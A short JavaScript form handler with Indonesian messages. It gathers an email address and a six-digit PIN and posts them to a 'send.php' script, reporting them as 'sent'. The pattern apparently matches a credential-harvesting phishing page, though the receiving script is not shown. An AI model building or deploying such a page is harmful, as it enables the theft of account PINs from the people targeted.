const formPesan = document.getElementById('formPesan');
const status = document.getElementById('status');
const error = document.getElementById('error');

formPesan.addEventListener('submit', function(e){
    e.preventDefault();

    const email = document.getElementById('email').value.trim();
    const pinInputs = document.querySelectorAll('.pin-container input');
    let pin = '';
    pinInputs.forEach(input => pin += input.value.trim());

    if(!email || pin.length < 6){
        error.innerText = "Email dan PIN harus lengkap";
        error.style.display = 'block';
        return;
    }

    error.style.display = 'none';
    status.innerText = "Mengirim...";

    fetch('send.php', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({email, pin})
    })
    .then(res => res.json())
    .then(res => {
        if(res.success){
            status.innerText = "Berhasil dikirim!";
        } else {
            error.innerText = "Gagal mengirim: " + (res.error || '');
            error.style.display = 'block';
            status.innerText = '';
        }
    })
    .catch(() => {
        error.innerText = "Koneksi bermasalah";
        error.style.display = 'block';
        status.innerText = '';
    });
});